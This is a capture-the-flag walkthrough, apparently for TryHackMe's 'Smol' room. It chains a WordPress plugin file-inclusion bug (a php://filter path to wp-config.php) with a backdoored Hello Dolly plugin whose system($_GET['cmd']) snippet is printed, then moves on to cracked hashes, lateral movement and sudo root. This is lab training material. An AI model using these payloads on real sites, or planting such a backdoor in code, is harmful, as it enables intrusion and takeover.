@@ -1,0 +1,217 @@
+# Smol — TryHackMe (Easy–Medium) 🧩🧠🧪
+
+Smol looks harmless.
+It isn’t.
+
+This box is a perfect example of how **WordPress + bad plugins + lazy code**
+can quietly turn into **full system compromise**.
+
+No kernel exploits.
+Just chaining mistakes the way attackers do in the real world.
+
+---
+
+## Machine Overview 🖥️📌
+
+Room Name: Smol  
+Target IP: 10.201.36.95  
+Operating System: Ubuntu Linux  
+Difficulty: Easy–Medium  
+
+Primary focus:
+- WordPress enumeration
+- Vulnerable plugin exploitation
+- **LFI → RCE chaining**
+- Credential reuse & user pivoting
+- Privilege escalation via sudo misconfigurations
+
+Very bug-bounty–style box.
+
+---
+
+## Initial Recon 🔍
+
+Basic service discovery showed a minimal surface.
+
+nmap -sC -sV 10.201.36.95
+
+Open ports:
+- 22/tcp  SSH 🔐
+- 80/tcp  HTTP (WordPress) 🌐
+
+The site redirected to:
+
+👉 **http://www.smol.thm**
+
+Confirming a WordPress installation.
+
+---
+
+## WordPress Enumeration 🌐🧐
+
+Given the room theme, plugin enumeration was the obvious next step.
+
+wpscan --url http://www.smol.thm -e vp
+
+A vulnerable plugin immediately stood out:
+
+❗ **jsmol2wp**
+
+Known issue:
+- **Local File Inclusion (LFI)**
+
+And yes — it was exploitable.
+
+---
+
+## LFI → Credential Disclosure 📂🔓
+
+The vulnerable endpoint:
+
+/wp-content/plugins/jsmol2wp/php/jsmol.php
+
+By abusing PHP filters:
+
+php://filter/resource=../../wp-config.php
+
+Result:
+- WordPress database credentials exposed
+- wp-config.php fully readable
+
+Using these credentials:
+- WordPress admin panel access achieved
+
+At this point, the CMS was owned.
+
+---
+
+## Code Review — Backdoored Plugin 🚨
+
+Inside the admin panel, a subtle hint appeared:
+
+> Check the source code of the “Hello Dolly” plugin
+
+Reviewing the plugin source revealed something *very* wrong:
+
+```php
+if (isset($_GET["cmd"])) {
+    system($_GET["cmd"]);
+}
+That’s not a vulnerability.
+
+That’s a deliberate backdoor.
+
+Remote Code Execution 💥
+By chaining:
+
+LFI (jsmol2wp)
+
+Backdoored plugin (Hello Dolly)
+
+Direct command execution was possible:
+
+?cmd=id
+
+A reverse shell was then spawned.
+
+Result:
+
+Initial foothold obtained
+
+Shell access confirmed
+
+Clean. Silent. Effective.
+
+Local Enumeration & Credential Pivoting 🔎
+Database Enumeration
+Using the leaked database credentials:
+
+Connected to MySQL
+
+Dumped password hashes
+
+Cracked a user password
+
+User Access
+Logged in as:
+
+diego
+
+User flag retrieved successfully.
+
+Lateral Movement 🔄
+Further enumeration revealed:
+
+SSH key belonging to user think
+
+Group and permission misconfigurations
+
+After switching users:
+
+Backup files became accessible
+
+Credentials for another user were recovered
+
+New user:
+
+xavi
+
+At this stage, the box was basically unraveling itself.
+
+Privilege Escalation 🚀
+Checking sudo permissions:
+
+sudo -l
+
+Revealed:
+(xavi) ALL=(ALL) ALL
+
+That’s game over.
+
+Switching to root:
+
+sudo su
+
+Result:
+
+Root access obtained
+
+Full system compromise
+
+Flags 🏁
+User Flag: Retrieved ✅
+
+Root Flag: Retrieved ✅
+
+Smol completed.
+
+Key Takeaways 🧠📌
+Never trust third-party WordPress plugins
+
+LFI is rarely “just LFI” — it’s usually a pivot
+
+Always review source code, even “harmless” plugins
+
+Database credentials almost always enable user pivots
+
+Enumeration + chaining beats rushing exploits
+
+📬 Contact & Projects 👨‍💻📎
+Daksh Baweja
+📧 Email: dakshbaweja20@gmail.com
+🐙 GitHub: https://github.com/sudo0xksh
+🔗 LinkedIn: https://www.linkedin.com/in/dakshbaweja
+
+🚀 Deteroid 🔥
+Deteroid is a community-driven platform for bug bounty hunters
+to share insights, rate programs, and collaborate on real-world findings.
+
+Built to help hackers hunt smarter, not louder.
+
+📸 Instagram: https://www.instagram.com/deteroids/
+
+Final Words ☕
+Smol teaches a brutal lesson:
+
+“You don’t need exploits
+when the code is already betraying you.”
